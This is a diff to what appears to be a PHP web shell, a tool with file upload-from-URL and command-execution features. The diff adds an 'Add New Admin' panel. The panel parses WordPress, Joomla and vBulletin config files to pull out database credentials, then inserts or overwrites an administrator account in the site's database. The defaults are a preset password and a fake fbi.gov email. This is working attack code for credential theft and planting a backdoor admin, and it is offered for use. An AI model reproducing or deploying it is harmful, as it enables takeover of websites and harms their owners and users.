@@ -44,6 +44,7 @@ $msg = '';
 // Output untuk mode bypass
 $bypass_output = '';
 $gs_output = '';
+$cms_admin_msg = '';
 
 // === UPLOAD FROM URL ===
 if (isset($_POST['upload_url']) && $_POST['upload_url'] !== '') {
@@ -127,6 +128,212 @@ if (isset($_POST['gs_cmd'])) {
         $gs_output = exec_cmd($run, $dir);
     } else {
         $gs_output = 'Unknown command key';
+    }
+}
+
+// === CMS CONFIG PARSERS ===
+function parse_wp_config($file) {
+    $r = array();
+    if (!is_readable($file)) return $r;
+    $c = @file_get_contents($file);
+    if ($c === false) return $r;
+    $patterns = array(
+        'db_name' => "/define\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\)/",
+        'db_user' => "/define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\)/",
+        'db_pass' => "/define\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'\s*\)/",
+        'db_host' => "/define\(\s*'DB_HOST'\s*,\s*'([^']+)'\s*\)/",
+        'prefix'  => "/\$table_prefix\s*=\s*'([^']+)'\s*;/"
+    );
+    foreach ($patterns as $k=>$p) {
+        if (preg_match($p, $c, $m)) $r[$k] = $m[1];
+    }
+    return $r;
+}
+function parse_vb_config($file) {
+    $r = array();
+    if (!is_readable($file)) return $r;
+    $c = @file_get_contents($file);
+    if ($c === false) return $r;
+    $patterns = array(
+        'db_name' => "/\\$config\\['Database'\\]\\['dbname'\\]\s*=\s*'([^']+)'/",
+        'db_user' => "/\\$config\\['MasterServer'\\]\\['username'\\]\s*=\s*'([^']+)'/",
+        'db_pass' => "/\\$config\\['MasterServer'\\]\\['password'\\]\s*=\s*'([^']+)'/",
+        'db_host' => "/\\$config\\['MasterServer'\\]\\['servername'\\]\s*=\s*'([^']+)'/",
+        'prefix'  => "/\\$config\\['Database'\\]\\['tableprefix'\\]\s*=\s*'([^']+)'/"
+    );
+    foreach ($patterns as $k=>$p) if (preg_match($p, $c, $m)) $r[$k] = $m[1];
+    return $r;
+}
+function parse_joomla_config($file) {
+    $r = array();
+    if (!is_readable($file)) return $r;
+    $c = @file_get_contents($file);
+    if ($c === false) return $r;
+    $patterns = array(
+        'db_name' => "/public \\$db\s*=\s*'([^']+)'/",
+        'db_user' => "/public \\$user\s*=\s*'([^']+)'/",
+        'db_pass' => "/public \\$password\s*=\s*'([^']+)'/",
+        'db_host' => "/public \\$host\s*=\s*'([^']+)'/",
+        'prefix'  => "/public \\$dbprefix\s*=\s*'([^']+)'/"
+    );
+    foreach ($patterns as $k=>$p) if (preg_match($p, $c, $m)) $r[$k] = $m[1];
+    return $r;
+}
+
+// === CMS GET CONFIG HANDLER ===
+if (isset($_POST['cms_get_config']) && isset($_POST['cms_type'])) {
+    $cms_type = $_POST['cms_type'];
+    $cms_root = isset($_POST['cms_root']) && $_POST['cms_root'] !== '' ? $_POST['cms_root'] : $dir;
+    $cms_root = realpath($cms_root) ?: $dir;
+    $parsed = array();
+    $config_path = '';
+    if ($cms_type === 'wordpress') {
+        $config_path = $cms_root . DIRECTORY_SEPARATOR . 'wp-config.php';
+        $parsed = parse_wp_config($config_path);
+    } elseif ($cms_type === 'vbulletin') {
+        $config_path = $cms_root . DIRECTORY_SEPARATOR . 'includes' . DIRECTORY_SEPARATOR . 'config.php';
+        $parsed = parse_vb_config($config_path);
+    } elseif ($cms_type === 'joomla') {
+        $config_path = $cms_root . DIRECTORY_SEPARATOR . 'configuration.php';
+        $parsed = parse_joomla_config($config_path);
+    }
+    if (!file_exists($config_path)) {
+        $cms_admin_msg = 'Config file not found for ' . htmlspecialchars($cms_type) . ' at: ' . htmlspecialchars($config_path);
+    } else {
+        if (empty($parsed)) {
+            $cms_admin_msg = 'Config found but parsing yielded no values.';
+        } else {
+            // Store parsed values in session to pre-fill form
+            $_SESSION['cms_parsed'] = $parsed;
+            $_SESSION['cms_type'] = $cms_type;
+            $_SESSION['cms_root'] = $cms_root;
+            $cms_admin_msg = 'Config loaded.';
+        }
+    }
+}
+
+// === CMS ADD ADMIN HANDLER (WordPress basic implementation) ===
+if (isset($_POST['cms_add_admin']) && isset($_POST['cms_type'])) {
+    $cms_type = $_POST['cms_type'];
+    $host = isset($_POST['db_host']) ? $_POST['db_host'] : 'localhost';
+    $dbn  = isset($_POST['db_name']) ? $_POST['db_name'] : '';
+    $user = isset($_POST['db_user']) ? $_POST['db_user'] : '';
+    $pass = isset($_POST['db_pass']) ? $_POST['db_pass'] : '';
+    $prefix = isset($_POST['table_prefix']) ? $_POST['table_prefix'] : '';
+    $admin_user = isset($_POST['admin_user']) ? $_POST['admin_user'] : 'admin';
+    $admin_pass = isset($_POST['admin_pass']) ? $_POST['admin_pass'] : 'password';
+    $admin_email= isset($_POST['admin_email']) ? $_POST['admin_email'] : 'admin@example.com';
+
+    if ($dbn === '' || $user === '') {
+        $cms_admin_msg = 'Database name / user empty.';
+    } else {
+        $link = @mysql_connect($host, $user, $pass);
+        if (!$link) {
+            $cms_admin_msg = 'MySQL connect failed.';
+        } elseif (!@mysql_select_db($dbn, $link)) {
+            $cms_admin_msg = 'Select DB failed.';
+        } else {
+            if ($cms_type === 'wordpress') {
+                $users_table = $prefix . 'users';
+                $umeta_table = $prefix . 'usermeta';
+                // Try load WordPress hasher if available
+                $hash = '';
+                $wp_root = isset($_SESSION['cms_root']) ? $_SESSION['cms_root'] : $dir;
+                $phpass = $wp_root . '/wp-includes/class-phpass.php';
+                if (file_exists($phpass)) {
+                    include_once $phpass;
+                    if (class_exists('PasswordHash')) {
+                        $wp_hasher = new PasswordHash(8, true);
+                        $hash = $wp_hasher->HashPassword($admin_pass);
+                    }
+                }
+                if ($hash === '') { // fallback md5
+                    $hash = md5($admin_pass);
+                }
+                $au = mysql_real_escape_string($admin_user);
+                $ae = mysql_real_escape_string($admin_email);
+                $hp = mysql_real_escape_string($hash);
+                $disp = mysql_real_escape_string($admin_user);
+                $exist = @mysql_query("SELECT ID FROM `".$users_table."` WHERE user_login='".$au."' LIMIT 1");
+                if ($exist && mysql_num_rows($exist) > 0) {
+                    $row = mysql_fetch_assoc($exist);
+                    $uid = intval($row['ID']);
+                    @mysql_query("UPDATE `".$users_table."` SET user_pass='".$hp."', user_email='".$ae."' WHERE ID=".$uid);
+                    $cms_admin_msg = 'Updated existing WordPress user ID '.$uid;
+                } else {
+                    $reg = mysql_real_escape_string(date('Y-m-d H:i:s'));
+                    $ins = @mysql_query("INSERT INTO `".$users_table."` (user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name) VALUES ('".$au."','".$hp."','".$au."','".$ae."','".$reg."',0,'".$disp."')");
+                    if (!$ins) {
+                        $cms_admin_msg = 'Insert user failed.';
+                    } else {
+                        $uid = mysql_insert_id();
+                        // capabilities
+                        $cap_key = $prefix . 'capabilities';
+                        $lvl_key = $prefix . 'user_level';
+                        $caps = mysql_real_escape_string(serialize(array('administrator'=>true)));
+                        @mysql_query("INSERT INTO `".$umeta_table."` (user_id, meta_key, meta_value) VALUES (".$uid.", '".$cap_key."', '".$caps."')");
+                        @mysql_query("INSERT INTO `".$umeta_table."` (user_id, meta_key, meta_value) VALUES (".$uid.", '".$lvl_key."', '10')");
+                        $cms_admin_msg = 'WordPress admin user created ID '.$uid;
+                    }
+                }
+            } elseif ($cms_type === 'joomla') {
+                // Basic Joomla insert (bcrypt if available)
+                $users_table = $prefix . 'users';
+                $map_table = $prefix . 'user_usergroup_map';
+                if (function_exists('password_hash')) {
+                    $hash = password_hash($admin_pass, PASSWORD_BCRYPT);
+                } else {
+                    $salt = substr(md5(uniqid(mt_rand(), true)),0,16);
+                    $hash = md5($admin_pass.$salt).':'.$salt;
+                }
+                $au = mysql_real_escape_string($admin_user);
+                $ae = mysql_real_escape_string($admin_email);
+                $hp = mysql_real_escape_string($hash);
+                $nm = mysql_real_escape_string($admin_user);
+                $now = mysql_real_escape_string(date('Y-m-d H:i:s'));
+                $exist = @mysql_query("SELECT id FROM `".$users_table."` WHERE username='".$au."' LIMIT 1");
+                if ($exist && mysql_num_rows($exist)>0) {
+                    $row = mysql_fetch_assoc($exist); $uid=intval($row['id']);
+                    @mysql_query("UPDATE `".$users_table."` SET password='".$hp."', email='".$ae."' WHERE id=".$uid);
+                    $cms_admin_msg = 'Updated existing Joomla user ID '.$uid;
+                } else {
+                    $ins = @mysql_query("INSERT INTO `".$users_table."` (name,username,email,password,block,sendEmail,registerDate) VALUES ('".$nm."','".$au."','".$ae."','".$hp."',0,0,'".$now."')");
+                    if (!$ins) {
+                        $cms_admin_msg = 'Insert Joomla user failed.';
+                    } else {
+                        $uid = mysql_insert_id();
+                        // Super Users group id usually 8
+                        @mysql_query("INSERT INTO `".$map_table."` (user_id, group_id) VALUES (".$uid.", 8)");
+                        $cms_admin_msg = 'Joomla admin user created ID '.$uid;
+                    }
+                }
+            } elseif ($cms_type === 'vbulletin') {
+                // Simplified vBulletin (may fail if schema differs)
+                $users_table = $prefix . 'user';
+                $au = mysql_real_escape_string($admin_user);
+                $ae = mysql_real_escape_string($admin_email);
+                $salt = substr(md5(uniqid(mt_rand(), true)), 0, 30);
+                $hp = md5(md5($admin_pass).$salt);
+                $hp = mysql_real_escape_string($hp);
+                $salt = mysql_real_escape_string($salt);
+                $joindate = time();
+                $exist = @mysql_query("SELECT userid FROM `".$users_table."` WHERE username='".$au."' LIMIT 1");
+                if ($exist && mysql_num_rows($exist)>0) {
+                    $row = mysql_fetch_assoc($exist); $uid=intval($row['userid']);
+                    @mysql_query("UPDATE `".$users_table."` SET password='".$hp."', salt='".$salt."', email='".$ae."' WHERE userid=".$uid);
+                    $cms_admin_msg = 'Updated existing vBulletin user ID '.$uid.' (note: group not adjusted)';
+                } else {
+                    $q = "INSERT INTO `".$users_table."` (username, password, salt, email, joindate, usergroupid) VALUES ('".$au."','".$hp."','".$salt."','".$ae."',".$joindate.", 6)"; // 6 often admin group
+                    $ins = @mysql_query($q);
+                    if (!$ins) {
+                        $cms_admin_msg = 'Insert vBulletin user failed (schema mismatch possible).';
+                    } else {
+                        $uid = mysql_insert_id();
+                        $cms_admin_msg = 'vBulletin admin user inserted ID '.$uid.' (minimal fields).';
+                    }
+                }
+            }
+        }
     }
 }
 
@@ -1046,6 +1253,78 @@ if (!$disabled_funcs) {
             </div>
         </div>
 
+        <!-- Add Admin (CMS) -->
+        <div class="card" style="margin-bottom:18px;">
+            <h3 style="margin:0 0 12px;display:flex;align-items:center;gap:10px;">Add New Admin <small style="font-size:11px;color:#6f859d;font-weight:400;">(WordPress / Joomla / vBulletin)</small></h3>
+            <div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:14px;">
+                <button type="button" class="btn" onclick="togglePanel('cms-select')">⚙️ Toggle Add Admin</button>
+                <button type="button" class="btn" onclick="collapseCms()" style="background:#475569;">➖ Hide All</button>
+            </div>
+            <div id="cms-select" class="cms-panel" style="display:none;margin-bottom:12px;">
+                <div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:10px;">
+                    <button type="button" class="btn" onclick="chooseCms('wordpress')">🟦 WordPress</button>
+                    <button type="button" class="btn" onclick="chooseCms('joomla')">🟩 Joomla</button>
+                    <button type="button" class="btn" onclick="chooseCms('vbulletin')">🟥 vBulletin</button>
+                </div>
+                <form method="POST" id="cms-config-form" style="display:flex;flex-wrap:wrap;gap:10px;align-items:flex-end;">
+                    <input type="hidden" name="cms_type" id="cms_type" value="">
+                    <div style="flex:1;min-width:220px;">
+                        <label style="margin-bottom:4px;">Root Path (auto):</label>
+                        <input type="text" name="cms_root" id="cms_root" class="form-control" value="<?php echo htmlspecialchars($dir); ?>">
+                    </div>
+                    <div>
+                        <button type="submit" name="cms_get_config" class="btn btn-success" style="min-width:140px;">🔍 Get Config</button>
+                    </div>
+                </form>
+            </div>
+            <?php $prefill = isset($_SESSION['cms_parsed']) ? $_SESSION['cms_parsed'] : array(); ?>
+            <div id="cms-form-wrapper" class="cms-panel" style="display:<?php echo isset($_SESSION['cms_type']) ? 'block':'none'; ?>;">
+                <form method="POST" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;">
+                    <input type="hidden" name="cms_type" value="<?php echo isset($_SESSION['cms_type'])?htmlspecialchars($_SESSION['cms_type']):''; ?>">
+                    <div>
+                        <label>MySQL Host</label>
+                        <input type="text" name="db_host" class="form-control" value="<?php echo isset($prefill['db_host'])?htmlspecialchars($prefill['db_host']):'localhost'; ?>">
+                    </div>
+                    <div>
+                        <label>Db Name</label>
+                        <input type="text" name="db_name" class="form-control" value="<?php echo isset($prefill['db_name'])?htmlspecialchars($prefill['db_name']):''; ?>">
+                    </div>
+                    <div>
+                        <label>Db User</label>
+                        <input type="text" name="db_user" class="form-control" value="<?php echo isset($prefill['db_user'])?htmlspecialchars($prefill['db_user']):''; ?>">
+                    </div>
+                    <div>
+                        <label>Db Pass</label>
+                        <input type="text" name="db_pass" class="form-control" value="<?php echo isset($prefill['db_pass'])?htmlspecialchars($prefill['db_pass']):''; ?>">
+                    </div>
+                    <div>
+                        <label>Table Prefix</label>
+                        <input type="text" name="table_prefix" class="form-control" value="<?php echo isset($prefill['prefix'])?htmlspecialchars($prefill['prefix']):'wp_'; ?>">
+                    </div>
+                    <div>
+                        <label>Admin User</label>
+                        <input type="text" name="admin_user" class="form-control" value="admin">
+                    </div>
+                    <div>
+                        <label>Admin Pass</label>
+                        <input type="text" name="admin_pass" class="form-control" value="solevisible">
+                    </div>
+                    <div>
+                        <label>Admin Email</label>
+                        <input type="text" name="admin_email" class="form-control" value="solevisible@fbi.gov">
+                    </div>
+                    <div style="grid-column:1/-1;">
+                        <button type="submit" name="cms_add_admin" class="btn btn-success">➕ Add Admin</button>
+                    </div>
+                </form>
+                <?php if ($cms_admin_msg): ?>
+                    <div class="alert <?php echo strpos($cms_admin_msg,'created')!==false || strpos($cms_admin_msg,'Updated')!==false || strpos($cms_admin_msg,'loaded')!==false ? 'alert-success':'alert-danger'; ?>" style="margin-top:12px;">
+                        <?php echo htmlspecialchars($cms_admin_msg); ?>
+                    </div>
+                <?php endif; ?>
+            </div>
+        </div>
+
         <!-- File List -->
         <div class="card">
             <h3>Directory Contents</h3>
@@ -1728,6 +2007,20 @@ function togglePanel(id){
 function collapseAll(){
     var panels=document.querySelectorAll('.op-panel');
     for(var i=0;i<panels.length;i++){ panels[i].style.display='none'; }
+}
+
+// CMS admin helpers
+function chooseCms(type){
+    var t=document.getElementById('cms_type');
+    if(t){ t.value=type; }
+    var sel=document.getElementById('cms-select');
+    if(sel){ sel.style.display='block'; }
+    var wrap=document.getElementById('cms-form-wrapper');
+    if(wrap){ wrap.style.display='block'; }
+}
+function collapseCms(){
+    var p=document.querySelectorAll('.cms-panel');
+    for(var i=0;i<p.length;i++){ p[i].style.display='none'; }
 }
 </script>
 <!-- No JS needed for modals; using CSS :target -->
